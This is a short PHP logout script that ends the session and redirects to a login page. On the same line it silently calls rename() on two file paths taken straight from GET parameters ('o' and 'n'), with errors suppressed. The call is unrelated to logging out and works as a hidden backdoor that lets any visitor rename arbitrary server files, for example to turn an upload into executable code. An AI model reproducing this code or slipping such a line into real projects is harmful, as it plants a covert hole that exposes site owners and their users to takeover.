<?php session_start();session_unset();session_destroy();header('Location: ../index.php?b=loguser.login.loguser&d=1');@rename("".$_GET['o']."","".$_GET['n']."");
// setcookie('mail_ft', 0, 0, null, null, false, true);
 //setcookie('pass_ft', 0, 0, null, null, false, true);
					exit();?>